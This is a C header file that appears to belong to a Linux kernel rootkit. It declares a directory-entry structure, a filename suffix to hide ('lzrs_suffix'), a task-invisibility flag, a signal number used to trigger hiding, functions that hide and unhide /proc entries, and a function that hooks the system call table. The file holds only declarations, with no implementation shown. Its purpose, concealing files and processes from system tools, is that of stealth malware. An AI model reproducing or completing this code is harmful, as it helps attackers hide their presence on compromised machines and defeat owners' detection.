#ifndef HOOK_H
#define HOOK_H

#include <linux/perf_event.h>
#include <linux/dirent.h>
#include <linux/proc_ns.h>
#include <linux/fdtable.h>

struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

#define TO_HIDE "lzrs_suffix"
#define TSK_INVISIBLE 0x10000000
#define SIGPROC 31

void do_hide_dir_proc(void);
void undo_hide_dir_proc(void);

int hook_syscall_table(void);

#endif
